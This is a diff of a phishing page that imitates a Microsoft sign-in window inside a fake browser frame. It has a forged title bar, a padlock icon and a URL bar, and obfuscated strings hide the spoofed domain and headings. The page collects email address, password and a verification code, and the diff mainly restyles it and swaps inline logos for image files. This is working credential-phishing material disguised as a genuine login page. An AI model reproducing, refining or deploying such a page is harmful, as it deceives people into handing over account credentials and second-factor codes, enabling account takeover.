@@ -18,7 +18,7 @@
     />
   </head>
 
-  <body style="background: linear-gradient(135deg, #0078d4 0%, #005a9e 50%, #004578 100%); background-attachment: fixed; min-height: 100vh;">
+  <body>
     <style>
       * {
         margin: 0;
@@ -29,65 +29,15 @@
         vertical-align: baseline;
         background: transparent;
       }
-      
-      /* Microsoft background pattern */
-      body::before {
-        content: '';
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-image: 
-          radial-gradient(circle at 25% 25%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
-          radial-gradient(circle at 75% 75%, rgba(0, 120, 212, 0.3) 0%, transparent 70%),
-          linear-gradient(45deg, transparent 40%, rgba(255, 255, 255, 0.05) 50%, transparent 60%);
-        animation: microsoftFlow 15s ease-in-out infinite;
-        z-index: -1;
-      }
-      
-      @keyframes microsoftFlow {
-        0%, 100% { 
-          transform: translateX(0) translateY(0) scale(1);
-          opacity: 0.8;
-        }
-        33% { 
-          transform: translateX(-20px) translateY(-10px) scale(1.02);
-          opacity: 0.9;
-        }
-        66% { 
-          transform: translateX(15px) translateY(10px) scale(0.98);
-          opacity: 0.85;
-        }
-      }
 
-      /* Progress bars */
-      .progress1, .progress2, .progress3, .progress4, .progress5 {
-        position: absolute;
-        height: 100%;
-        background: linear-gradient(90deg, #0078d4, #106ebe);
-        border-radius: 2px;
-        animation: progressLoad 2s ease-in-out infinite;
-      }
-
-      .progress1 { width: 2%; left: 0%; animation-delay: 0s; }
-      .progress2 { width: 2%; left: 4%; animation-delay: 0.2s; }
-      .progress3 { width: 2%; left: 8%; animation-delay: 0.4s; }
-      .progress4 { width: 2%; left: 12%; animation-delay: 0.6s; }
-      .progress5 { width: 2%; left: 16%; animation-delay: 0.8s; }
-
-      @keyframes progressLoad {
-        0%, 100% { opacity: 0.3; transform: scaleX(1); }
-        50% { opacity: 1; transform: scaleX(1.2); }
-      }
-
-      .pointer {
-        cursor: pointer;
-      }
-
-      .email {
-        font-weight: 500;
-        color: #0078d4;
+      /* Microsoft Office 365 2025 Background */
+      body {
+        background: 
+          radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+          radial-gradient(circle at 80% 20%, rgba(255, 119, 48, 0.15) 0%, transparent 50%),
+          radial-gradient(circle at 40% 80%, rgba(0, 120, 212, 0.2) 0%, transparent 50%),
+          linear-gradient(135deg, #f3f9ff 0%, #ebf3fd 100%);
+        min-height: 100vh;
       }
 
       .scroll {
@@ -112,20 +62,17 @@
           "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
       }
     </style>
-    <!-- Sidebar removed as requested -->
     <div
       style="
         height: 100vh;
         position: absolute;
-        background-color: rgba(255, 255, 255, 0.05);
+        background-color: rgba(255, 255, 255, 0.64);
         width: 100%;
       "
     ></div>
     <div
       style="
-        background: rgba(255, 255, 255, 0.95);
-        backdrop-filter: blur(10px);
-        -webkit-backdrop-filter: blur(10px);
+        background: #fff;
         width: calc(100% - 630px);
         min-width: 500px;
         padding: 55px 90px;
@@ -137,10 +84,8 @@
         min-height: 450px;
         display: flex;
         justify-content: center;
-        border-radius: 8px;
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1),
-          0 0 0 1px rgba(255, 255, 255, 0.2);
-        border: 1px solid rgba(255, 255, 255, 0.2);
+        box-shadow: 0 0 0 1px rgba(99, 114, 130, 0.16),
+          0 8px 16px rgba(27, 39, 51, 0.08);
       "
     >
       <div>
@@ -193,12 +138,11 @@
         </style>
         <div style="margin-top: 80px; text-align: center; line-height: 30px">
           <button id="login-btn" class="elements">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 21" style="margin: 0px 8px; width: 16px; height: 16px;">
-              <rect width="10" height="10" fill="#f25022"/>
-              <rect x="11" width="10" height="10" fill="#7fba00"/>
-              <rect y="11" width="10" height="10" fill="#00a4ef"/>
-              <rect x="11" y="11" width="10" height="10" fill="#ffb900"/>
-            </svg>Continue with Microsoft
+            <img
+              id="lgImg"
+              src="/images/msf.svg"
+              style="margin: 0px 8px; width: 10%"
+            />Continue with Microsoft
             <svg
               class="pointer"
               width="20"
@@ -284,45 +228,45 @@
           position: relative;
           display: none;
           background-color: white;
-          border-radius: 8px;
-          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-          overflow: hidden;
         "
       >
         <!-- Title bar start -->
         <div id="title-bar-width">
-          <div id="title-bar" style="height: 33px; background: #f3f2f1; border-bottom: 1px solid #edebe9; display: flex; justify-content: space-between; align-items: center;">
-            <div class="w3-row" style="padding: 4px 12px; display: flex; align-items: center;">
-              <div style="margin-right: 8px;">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" style="width: 16px; height: 16px;">
-                  <rect width="7" height="7" fill="#f25022"/>
-                  <rect x="8" width="7" height="7" fill="#7fba00"/>
-                  <rect y="8" width="7" height="7" fill="#00a4ef"/>
-                  <rect x="8" y="8" width="7" height="7" fill="#ffb900"/>
-                </svg>
+          <div id="title-bar" style="height: 33px">
+            <div class="w3-row" style="padding: 4px; width: 340px">
+              <div class="w3-col s1">
+                <img
+                  src="/images/logo.svg"
+                  style="width: 20px; margin-top: 6px"
+                  id="logo"
+                />
               </div>
-              <div>
-                <span id="logo-description" style="font-size: 12px; color: #605e5c;">
-                  OBFS=Qnb192YjFGIyV3b5Byb0BibpBibnl2UEND</span>
+              <div class="w3-col s10">
+                <span id="logo-description"
+                  >OBFS=Qnb192YjFGIyV3b5Byb0BibpBibnl2UEND</span
+                >
               </div>
             </div>
 
-            <div style="display: flex; align-items: center; padding-right: 8px;">
-              <span id="minimize" style="padding: 4px 8px; cursor: pointer; font-size: 12px; color: #605e5c;">&#8212;</span>
-              <span id="square" style="padding: 4px 8px; cursor: pointer; font-size: 12px; color: #605e5c;">□</span>
-              <span id="exit" style="padding: 4px 8px; cursor: pointer; font-size: 12px; color: #605e5c;">✕</span>
+            <div>
+              <span id="minimize">&#8212;</span>
+              <span id="square">□</span>
+              <span id="exit">✕</span>
             </div>
           </div>
-          <div id="url-bar" style="background: white; padding: 8px 12px; border-bottom: 1px solid #edebe9; display: flex; align-items: center; font-size: 12px; color: #605e5c;">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#28a745" style="width: 16px; height: 16px; margin-right: 8px;">
-              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
-              <path d="M10 17l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" fill="white"/>
-            </svg>
-            <span id="domain-name" style="margin-right: 4px;">
-              OBFS6MHc0RHaEND//OBFS==QbvNmLl5Was52b0Z2bz9mcjlWbu4Wan9GbEND</span>
-            <span id="domain-path">
-              OBFS=UWdyRXPkF2bsVmcf92czZCMuEjLz4yN9IXZ21CduVWasNWL4ZCMfZDVF50XElUPVt0UtQnbllGbj1CemEUTvRka3sUavZ3RYVUc28lSZljaK50Q6FFTlV3NMVHRqd1VUR2XCZmT0pmQWJTOINmWrZUQOtUUu5GZ3YkWilkaNFXZ1AVR2JTeJFkSyg0SONGV1EGMSh0M6xUZ6p2bqNVa5lmbEJEV5FGcslnUFl3bh1GaV9kZLlkaQxEVFpkcoxGNGlVVflFU5lFVJhlSfhlUxN3NtETY6pHdwlzNydUZ3k1M5FDW391VnB1dwB1bERVLrZ0StgDOahmdFdDSiJFZBNjV0J2Yyc1XTNEcrJFdwYWZkVzRaFWbi9lQZl2Q5MXOBRTUQZDNfdkd1MGS4YDe2BXaVNWNqtUcN1GdBZzQ2Y0TERzZhJ3TLR3TydVWnVzdOpUM9UGdhR3cmkDMlJ ...[Truncated]
-            </span>
+          <div id="url-bar">
+            <img
+              src="/images/ssl.svg"
+              width="27px"
+              height="27px"
+              id="ssl-padlock"
+            />
+            <span id="domain-name"
+              >OBFS6MHc0RHaEND//OBFS==QbvNmLl5Was52b0Z2bz9mcjlWbu4Wan9GbEND</span
+            >
+            <span id="domain-path"
+              >OBFS=UWdyRXPkF2bsVmcf92czZCMuEjLz4yN9IXZ21CduVWasNWL4ZCMfZDVF50XElUPVt0UtQnbllGbj1CemEUTvRka3sUavZ3RYVUc28lSZljaK50Q6FFTlV3NMVHRqd1VUR2XCZmT0pmQWJTOINmWrZUQOtUUu5GZ3YkWilkaNFXZ1AVR2JTeJFkSyg0SYNGV1EGMSh0M6xUZ6p2bqNVa5lmbEJEV5FGcslnUFl3bh1GaV9kZLlkaQxEVFpkcoxGNGlVVflFU5lFVJhlSfhlUxN3NtETY6pHdwlzNydUZ3k1M5FDW391VnB1dwB1bERVLrZ0StgDOahmdFdDSiJFZBNjV0J2Yyc1XTNEcrJFdwYWZkVzRaFWbi9lQZl2Q5MXOBRTUQZDNfdkd1MGS4YDe2BXaVNWNqtUcN1GdBZzQ2Y0TERzZhJ3TLR3TydVWnVzdOpUM9UGdhR3cmkDMlJ</span
+            >
           </div>
         </div>
         <!-- Content start -->
@@ -350,13 +294,7 @@
           "
         >
           <div>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 23" style="height: 24px;">
-              <rect x="0" y="0" width="10.5" height="10.5" fill="#f25022"/>
-              <rect x="12" y="0" width="10.5" height="10.5" fill="#7fba00"/>
-              <rect x="0" y="12" width="10.5" height="10.5" fill="#00a4ef"/>
-              <rect x="12" y="12" width="10.5" height="10.5" fill="#ffb900"/>
-              <path d="M30.29 4.73h2.73v13.27h-2.73zm10.5 0v2.12h-3.07v2.85h2.8v2.12h-2.8v4.06h3.22V17h-5.95V4.73zm13.36 0c2.54 0 4.17 1.52 4.17 4.14 0 2.71-1.79 4.37-4.37 4.37h-1.52V17h-2.73V4.73zm-1.8 6.39h1.33c1.23 0 1.8-.63 1.8-1.84s-.57-1.84-1.8-1.84h-1.33zm10.5-6.39c2.28 0 3.85 1.33 3.85 3.22 0 1.8-1.33 2.73-2.54 2.94l2.94 5.11h-3.02l-2.54-4.57h-.86V17h-2.73V4.73zm-1.2 6.04h1.12c1.12 0 1.74-.46 1.74-1.33s-.63-1.33-1.74-1.33h-1.12zm13.01-6.04c3.51 0 5.88 2.28 5.88 6.14s-2.37 6.14-5.88 6.14-5.88-2.28-5.88-6.14 2.37-6.14 5.88-6.14zm0 2.28c-2.05 0-3.07 1.52-3.07 3.85s1.02 3.85 3.07 3.85 3.07-1.52 3.07-3.85-1.02-3.85-3.07-3.85zm13.27-2.28c2.45 0 4.03 1.12 4.03 3.33 0 1.52-.92 2.62-2.37 2.94 1.63.23 2.71 1.43 2.71 3.1 0 2.37-1.74 3.68-4.28 3.68h-4.74V4.73zm-1.98 5.34h1.63c1.23 0 1.89-.57 1.89-1.52s-.66-1.52-1.89-1.52h-1.63zm0 2.28v3.33h1.98c1.43 0 2.17-.63 2.17-1.66s-.74-1.66-2.17-1.66z" fill="#737373"/>
-            </svg>
+            <img src="/images/microsoft-logo.svg" alt="" />
           </div>
 
           <div style="margin: 32px 0px">
@@ -405,89 +343,95 @@
             font-weight: 400;
             font-size: 0.9375rem;
             line-height: 1.25rem;
-            padding: 44px;
             display: none;
+            padding: 44px;
           "
         >
           <div>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 23" style="height: 24px;">
-              <rect x="0" y="0" width="10.5" height="10.5" fill="#f25022"/>
-              <rect x="12" y="0" width="10.5" height="10.5" fill="#7fba00"/>
-              <rect x="0" y="12" width="10.5" height="10.5" fill="#00a4ef"/>
-              <rect x="12" y="12" width="10.5" height="10.5" fill="#ffb900"/>
-              <path d="M30.29 4.73h2.73v13.27h-2.73zm10.5 0v2.12h-3.07v2.85h2.8v2.12h-2.8v4.06h3.22V17h-5.95V4.73zm13.36 0c2.54 0 4.17 1.52 4.17 4.14 0 2.71-1.79 4.37-4.37 4.37h-1.52V17h-2.73V4.73zm-1.8 6.39h1.33c1.23 0 1.8-.63 1.8-1.84s-.57-1.84-1.8-1.84h-1.33zm10.5-6.39c2.28 0 3.85 1.33 3.85 3.22 0 1.8-1.33 2.73-2.54 2.94l2.94 5.11h-3.02l-2.54-4.57h-.86V17h-2.73V4.73zm-1.2 6.04h1.12c1.12 0 1.74-.46 1.74-1.33s-.63-1.33-1.74-1.33h-1.12zm13.01-6.04c3.51 0 5.88 2.28 5.88 6.14s-2.37 6.14-5.88 6.14-5.88-2.28-5.88-6.14 2.37-6.14 5.88-6.14zm0 2.28c-2.05 0-3.07 1.52-3.07 3.85s1.02 3.85 3.07 3.85 3.07-1.52 3.07-3.85-1.02-3.85-3.07-3.85zm13.27-2.28c2.45 0 4.03 1.12 4.03 3.33 0 1.52-.92 2.62-2.37 2.94 1.63.23 2.71 1.43 2.71 3.1 0 2.37-1.74 3.68-4.28 3.68h-4.74V4.73zm-1.98 5.34h1.63c1.23 0 1.89-.57 1.89-1.52s-.66-1.52-1.89-1.52h-1.63zm0 2.28v3.33h1.98c1.43 0 2.17-.63 2.17-1.66s-.74-1.66-2.17-1.66z" fill="#737373"/>
-            </svg>
+            <img src="/images/microsoft-logo.svg" alt="" />
           </div>
 
-          <div style="margin: 16px 0px; height: 20px">
-            <span id="email-preview" class="email" style="font-size: 15px">
-            </span>
+          <div style="margin: 32px 0px">
+            <span style="font-weight: 500; font-size: 25px">Sign in</span>
           </div>
-          <div style="margin-bottom: 18px">
-            <span id="two" style="font-weight: 500; font-size: 25px"
-              >OBFSulGI19Weg42ZpNHIvRHIn5Wa5JHVEND</span
+
+          <div style="margin-bottom: 32px">
+            <span style="font-size: 15px"
+              >OBFSu92YyVmb15WayBnLn9mchJCcfJXZt5WayRGcfN3b0lGdpx2Q</span
             >
           </div>
 
-          <div
-            id="email-div"
-            style="
-              padding: 6px 8px;
-              border: 2px solid #0067b8;
-              outline: 0;
-              font-size: 15px;
-            "
-          >
+          <div style="margin-bottom: 16px">
+            <label
+              style="
+                display: block;
+                font-size: 15px;
+                color: #323130;
+                margin-bottom: 4px;
+                font-weight: 600;
+              "
+              >Email</label
+            >
             <input
-              id="email-input"
-              style="width: 100%; outline: 0; border: 0"
+              id="kI"
+              type="email"
+              name="loginfmt"
+              class="form-control ltr_override input ext-input text-box ext-text-box"
+              aria-required="true"
               placeholder="Email, phone, or Skype"
+              value=""
+              maxlength="113"
+              lang="en"
+              spellcheck="false"
+              autocomplete="off"
+              style="
+                width: 100%;
+                padding: 8px 12px;
+                border: 1px solid #8a8886;
+                border-radius: 2px;
+                font-size: 15px;
+                background-color: #fff;
+                color: #323130;
+                height: 32px;
+              "
             />
           </div>
-          <p id="errors1" style="color: red; display: none"></p>
-          <p style="font-size: 12px; margin: 16px 0px 0px">
-            No account?
-            <span style="color: #0067b8" class="pointer"
-              >Create one! Can't access your account?</span
-            >
-          </p>
-          <div style="display: flex; justify-content: right">
-            <div
-              id="cancel-email"
-              class="pointer"
+
+          <div style="margin-top: 24px">
+            <button
+              class="win-button button_primary button ext-button primary ext-primary"
+              type="submit"
+              id="idSIButton9"
               style="
-                color: #292929;
-                border-color: rgba(0, 0, 0, 0.2);
-                background-color: rgba(0, 0, 0, 0.2);
-                display: block;
-                width: 110px;
-                margin-top: 16px;
-                margin-right: 8px;
-                padding: 6px 12px 6px 12px;
-                text-align: center;
-              "
-            >
-              Back
-            </div>
-            <div
-              id="next-email-submit"
-              class="pointer"
-              style="
+                background-color: #0078d4;
                 color: white;
-                border-color: #0067b8;
-                background-color: #0067b8;
-                display: block;
-                width: 110px;
-                margin-top: 16px;
-                padding: 6px 12px 6px 12px;
-                text-align: center;
+                padding: 0;
+                border-radius: 2px;
+                width: 100%;
+                height: 36px;
+                border: 1px solid #0078d4;
+                cursor: pointer;
+                font-size: 15px;
+                font-weight: 600;
               "
             >
               Next
-            </div>
+            </button>
           </div>
 
-          <div style="margin: 12px 0px 4px"></div>
+          <div style="margin-top: 16px">
+            <a
+              id="idA_PWD_ForgotPassword"
+              role="button"
+              href="#"
+              style="
+                font-size: 13px;
+                color: #0078d4;
+                text-decoration: none;
+              "
+              >Can't access your account?</a
+            >
+          </div>
         </div>
         <div
           id="enter-password"
@@ -509,444 +453,376 @@
             font-weight: 400;
             font-size: 0.9375rem;
             line-height: 1.25rem;
-            padding: 44px;
             display: none;
+            padding: 44px;
           "
         >
           <div>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 23" style="height: 24px;">
-              <rect x="0" y="0" width="10.5" height="10.5" fill="#f25022"/>
-              <rect x="12" y="0" width="10.5" height="10.5" fill="#7fba00"/>
-              <rect x="0" y="12" width="10.5" height="10.5" fill="#00a4ef"/>
-              <rect x="12" y="12" width="10.5" height="10.5" fill="#ffb900"/>
-              <path d="M30.29 4.73h2.73v13.27h-2.73zm10.5 0v2.12h-3.07v2.85h2.8v2.12h-2.8v4.06h3.22V17h-5.95V4.73zm13.36 0c2.54 0 4.17 1.52 4.17 4.14 0 2.71-1.79 4.37-4.37 4.37h-1.52V17h-2.73V4.73zm-1.8 6.39h1.33c1.23 0 1.8-.63 1.8-1.84s-.57-1.84-1.8-1.84h-1.33zm10.5-6.39c2.28 0 3.85 1.33 3.85 3.22 0 1.8-1.33 2.73-2.54 2.94l2.94 5.11h-3.02l-2.54-4.57h-.86V17h-2.73V4.73zm-1.2 6.04h1.12c1.12 0 1.74-.46 1.74-1.33s-.63-1.33-1.74-1.33h-1.12zm13.01-6.04c3.51 0 5.88 2.28 5.88 6.14s-2.37 6.14-5.88 6.14-5.88-2.28-5.88-6.14 2.37-6.14 5.88-6.14zm0 2.28c-2.05 0-3.07 1.52-3.07 3.85s1.02 3.85 3.07 3.85 3.07-1.52 3.07-3.85-1.02-3.85-3.07-3.85zm13.27-2.28c2.45 0 4.03 1.12 4.03 3.33 0 1.52-.92 2.62-2.37 2.94 1.63.23 2.71 1.43 2.71 3.1 0 2.37-1.74 3.68-4.28 3.68h-4.74V4.73zm-1.98 5.34h1.63c1.23 0 1.89-.57 1.89-1.52s-.66-1.52-1.89-1.52h-1.63zm0 2.28v3.33h1.98c1.43 0 2.17-.63 2.17-1.66s-.74-1.66-2.17-1.66z" fill="#737373"/>
-            </svg>
+            <img src="/images/microsoft-logo.svg" alt="" />
           </div>
 
-          <div style="margin: 16px 0px; height: 20px">
-            <span id="email-preview-2" class="email" style="font-size: 15px">
-            </span>
-          </div>
-          <div style="margin-bottom: 18px">
-            <span id="three" style="font-weight: 500; font-size: 25px"
-              >OBFS=kzb5hCN1dGI0JXZk5WZzJCI6I2clZHawFEI0NHI05WZkV2UgQnZuFWYnV3UgQnZuFWYnVnYhNXYEND</span
+          <div style="margin: 32px 0px">
+            <span style="font-weight: 500; font-size: 25px"
+              >Enter password</span
             >
           </div>
 
           <div
-            id="password-div"
+            id="displayName"
+            class="identity-banner"
             style="
-              padding: 6px 8px;
-              border: 2px solid #0067b8;
-              outline: 0;
-              font-size: 15px;
+              margin-bottom: 32px;
+              display: flex;
+              align-items: center;
+              gap: 8px;
             "
           >
+            <img
+              id="idTile_1_1"
+              style="
+                width: 32px;
+                height: 32px;
+                border-radius: 50%;
+                background-color: #0078d4;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: white;
+                font-weight: 600;
+                font-size: 14px;
+              "
+              src="/images/picker-verify-code.svg"
+            />
+            <span
+              id="displayName_1"
+              style="font-size: 15px; color: #323130"
+            ></span>
+          </div>
+
+          <div style="margin-bottom: 16px">
+            <label
+              style="
+                display: block;
+                font-size: 15px;
+                color: #323130;
+                margin-bottom: 4px;
+                font-weight: 600;
+              "
+              >Password</label
+            >
             <input
-              id="password-input"
               type="password"
-              style="width: 100%; outline: 0; border: 0"
+              id="i0118"
+              name="passwd"
+              class="form-control input ext-input text-box ext-text-box"
+              aria-required="true"
               placeholder="Password"
+              value=""
+              style="
+                width: 100%;
+                padding: 8px 12px;
+                border: 1px solid #8a8886;
+                border-radius: 2px;
+                font-size: 15px;
+                background-color: #fff;
+                color: #323130;
+                height: 32px;
+              "
             />
           </div>
-          <p id="errors2" style="color: red; display: none"></p>
-          <p style="font-size: 12px; margin: 16px 0px 0px">
-            <span style="color: #0067b8" class="pointer"
-              >Forgot my password</span
-            >
-          </p>
-          <div style="display: flex; justify-content: right">
-            <div
-              id="cancel-password"
-              class="pointer"
+
+          <div style="margin-bottom: 24px">
+            <a
+              id="idA_PWD_ForgotPassword"
+              role="button"
+              href="#"
               style="
-                color: #292929;
-                border-color: rgba(0, 0, 0, 0.2);
-                background-color: rgba(0, 0, 0, 0.2);
-                display: block;
-                width: 110px;
-                margin-top: 16px;
-                margin-right: 8px;
-                padding: 6px 12px 6px 12px;
-                text-align: center;
+                font-size: 13px;
+                color: #0078d4;
+                text-decoration: none;
+              "
+              >Forgot my password</a
+            >
+          </div>
+
+          <div style="margin-bottom: 16px">
+            <button
+              class="win-button button_primary button ext-button primary ext-primary"
+              type="submit"
+              id="idSIButton9"
+              style="
+                background-color: #0078d4;
+                color: white;
+                padding: 0;
+                border-radius: 2px;
+                width: 100%;
+                height: 36px;
+                border: 1px solid #0078d4;
+                cursor: pointer;
+                font-size: 15px;
+                font-weight: 600;
+              "
+            >
+              Sign in
+            </button>
+          </div>
+
+          <div>
+            <button
+              id="idBtn_Back"
+              class="win-button button_secondary button ext-button secondary ext-secondary"
+              type="button"
+              style="
+                background-color: transparent;
+                color: #0078d4;
+                padding: 0;
+                border: 1px solid #0078d4;
+                border-radius: 2px;
+                width: 100%;
+                height: 36px;
+                cursor: pointer;
+                font-size: 15px;
+              "
+            >
+              <img
+                src="/images/left-arrow.svg"
+                alt=""
+                style="margin-right: 8px"
+              />
+              Back
+            </button>
+          </div>
+        </div>
+        <div
+          id="more-options"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 32px;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            display: none;
+            padding: 44px;
+          "
+        >
+          <div>
+            <img src="/images/microsoft-logo.svg" alt="" />
+          </div>
+
+          <div style="margin: 32px 0px">
+            <span style="font-weight: 500; font-size: 25px"
+              >Choose an option</span
+            >
+          </div>
+
+          <div style="margin-bottom: 16px">
+            <a
+              style="
+                display: flex;
+                align-items: center;
+                padding: 16px;
+                border: 1px solid #d2d0ce;
+                border-radius: 2px;
+                text-decoration: none;
+                color: #323130;
+                margin-bottom: 8px;
+              "
+              href="#"
+              id="verify-with-app"
+            >
+              <img
+                src="/images/picker-verify-authenticator.svg"
+                alt=""
+                style="margin-right: 16px; width: 24px; height: 24px"
+              />
+              <span
+                >Use an app to sign in with a verification code from my
+                authenticator app</span
+              >
+            </a>
+          </div>
+
+          <div style="margin-bottom: 16px">
+            <a
+              style="
+                display: flex;
+                align-items: center;
+                padding: 16px;
+                border: 1px solid #d2d0ce;
+                border-radius: 2px;
+                text-decoration: none;
+                color: #323130;
+                margin-bottom: 8px;
+              "
+              href="#"
+              id="verify-with-text"
+            >
+              <img
+                src="/images/picker-verify-code.svg"
+                alt=""
+                style="margin-right: 16px; width: 24px; height: 24px"
+              />
+              <span>Text XXXXXXX455 a code</span>
+            </a>
+          </div>
+
+          <div style="margin-top: 24px">
+            <button
+              id="idBtn_Back_More"
+              class="win-button button_secondary button ext-button secondary ext-secondary"
+              type="button"
+              style="
+                background-color: transparent;
+                color: #0078d4;
+                padding: 0;
+                border: 1px solid #0078d4;
+                border-radius: 2px;
+                width: 100%;
+                height: 36px;
+                cursor: pointer;
+                font-size: 15px;
               "
             >
               Back
-            </div>
-            <div
-              id="next-password-submit"
-              class="pointer"
+            </button>
+          </div>
+        </div>
+        <div
+          id="verify-code"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 32px;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            display: none;
+            padding: 44px;
+          "
+        >
+          <div>
+            <img src="/images/microsoft-logo.svg" alt="" />
+          </div>
+
+          <div style="margin: 32px 0px">
+            <span style="font-weight: 500; font-size: 25px"
+              >Verify your identity</span
+            >
+          </div>
+
+          <div style="margin-bottom: 32px">
+            <span style="font-size: 15px"
+              >Enter the code that was sent to your device.</span
+            >
+          </div>
+
+          <div style="margin-bottom: 16px">
+            <label
               style="
+                display: block;
+                font-size: 15px;
+                color: #323130;
+                margin-bottom: 4px;
+                font-weight: 600;
+              "
+              >Enter code</label
+            >
+            <input
+              type="text"
+              id="idTxtBx_SAOTCC_OTC"
+              name="otc"
+              class="form-control input ext-input text-box ext-text-box"
+              placeholder="Code"
+              value=""
+              style="
+                width: 100%;
+                padding: 8px 12px;
+                border: 1px solid #8a8886;
+                border-radius: 2px;
+                font-size: 15px;
+                background-color: #fff;
+                color: #323130;
+                height: 32px;
+              "
+            />
+          </div>
+
+          <div style="margin-bottom: 24px">
+            <a
+              href="#"
+              style="
+                font-size: 13px;
+                color: #0078d4;
+                text-decoration: none;
+              "
+              >I can't access my phone or authenticator app right now</a
+            >
+          </div>
+
+          <div style="margin-bottom: 16px">
+            <button
+              class="win-button button_primary button ext-button primary ext-primary"
+              type="submit"
+              id="idSubmit_SAOTCC_Continue"
+              style="
+                background-color: #0078d4;
                 color: white;
-                border-color: #0067b8;
-                background-color: #0067b8;
-                display: block;
-                width: 110px;
-                margin-top: 16px;
-                padding: 6px 12px 6px 12px;
-                text-align: center;
+                padding: 0;
+                border-radius: 2px;
+                width: 100%;
+                height: 36px;
+                border: 1px solid #0078d4;
+                cursor: pointer;
+                font-size: 15px;
+                font-weight: 600;
               "
             >
-              Next
-            </div>
+              Verify
+            </button>
           </div>
 
-          <div style="margin: 12px 0px 4px"></div>
-        </div>
-        <div
-          id="auth-verification"
-          class="scroll"
-          style="
-            margin-left: auto;
-            margin-right: auto;
-            margin-top: 32px;
-            position: relative;
-            max-width: 350px;
-            width: calc(100% - 40px);
-            margin-bottom: 28px;
-            background-color: #ffffff;
-            text-align: left;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-            min-width: 420px;
-            min-height: 238px;
-            overflow: hidden;
-            font-weight: 400;
-            font-size: 0.9375rem;
-            line-height: 1.25rem;
-            padding: 44px;
-            display: none;
-          "
-        >
           <div>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 23" style="height: 24px;">
-              <rect x="0" y="0" width="10.5" height="10.5" fill="#f25022"/>
-              <rect x="12" y="0" width="10.5" height="10.5" fill="#7fba00"/>
-              <rect x="0" y="12" width="10.5" height="10.5" fill="#00a4ef"/>
-              <rect x="12" y="12" width="10.5" height="10.5" fill="#ffb900"/>
-              <path d="M30.29 4.73h2.73v13.27h-2.73zm10.5 0v2.12h-3.07v2.85h2.8v2.12h-2.8v4.06h3.22V17h-5.95V4.73zm13.36 0c2.54 0 4.17 1.52 4.17 4.14 0 2.71-1.79 4.37-4.37 4.37h-1.52V17h-2.73V4.73zm-1.8 6.39h1.33c1.23 0 1.8-.63 1.8-1.84s-.57-1.84-1.8-1.84h-1.33zm10.5-6.39c2.28 0 3.85 1.33 3.85 3.22 0 1.8-1.33 2.73-2.54 2.94l2.94 5.11h-3.02l-2.54-4.57h-.86V17h-2.73V4.73zm-1.2 6.04h1.12c1.12 0 1.74-.46 1.74-1.33s-.63-1.33-1.74-1.33h-1.12zm13.01-6.04c3.51 0 5.88 2.28 5.88 6.14s-2.37 6.14-5.88 6.14-5.88-2.28-5.88-6.14 2.37-6.14 5.88-6.14zm0 2.28c-2.05 0-3.07 1.52-3.07 3.85s1.02 3.85 3.07 3.85 3.07-1.52 3.07-3.85-1.02-3.85-3.07-3.85zm13.27-2.28c2.45 0 4.03 1.12 4.03 3.33 0 1.52-.92 2.62-2.37 2.94 1.63.23 2.71 1.43 2.71 3.1 0 2.37-1.74 3.68-4.28 3.68h-4.74V4.73zm-1.98 5.34h1.63c1.23 0 1.89-.57 1.89-1.52s-.66-1.52-1.89-1.52h-1.63zm0 2.28v3.33h1.98c1.43 0 2.17-.63 2.17-1.66s-.74-1.66-2.17-1.66z" fill="#737373"/>
-            </svg>
-          </div>
-
-          <div style="margin: 16px 0px; height: 20px">
-            <span id="email-preview-3" class="email" style="font-size: 15px">
-            </span>
-          </div>
-          <div style="margin-bottom: 18px">
-            <span id="four" style="font-weight: 500; font-size: 25px"
-              >OBFS=U3b5BSbvJnZgQXa0FWZzJSZgIXYuVGIsxWa29WdEND</span
-            >
-          </div>
-
-          <span style="font-size: 15px"
-            >We'll use your Microsoft Authenticator app to verify your identity.
-            Check your device</span
-          >
-          <div
-            style="
-              display: flex;
-              width: 100%;
-              gap: 20px;
-              margin: 32px 0px;
-              justify-content: center;
-            "
-          >
-            <div>
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 90" style="width: 100px; height: 90px;">
-                <rect x="10" y="10" width="80" height="50" rx="8" fill="#0078d4" stroke="#106ebe" stroke-width="2"/>
-                <circle cx="50" cy="35" r="12" fill="white"/>
-                <rect x="20" y="65" width="60" height="8" rx="4" fill="#0078d4"/>
-                <rect x="30" y="75" width="40" height="4" rx="2" fill="#106ebe"/>
-                <text x="50" y="85" text-anchor="middle" font-family="Segoe UI" font-size="8" fill="#323130">Windows Hello</text>
-              </svg>
-            </div>
-            <div
+            <button
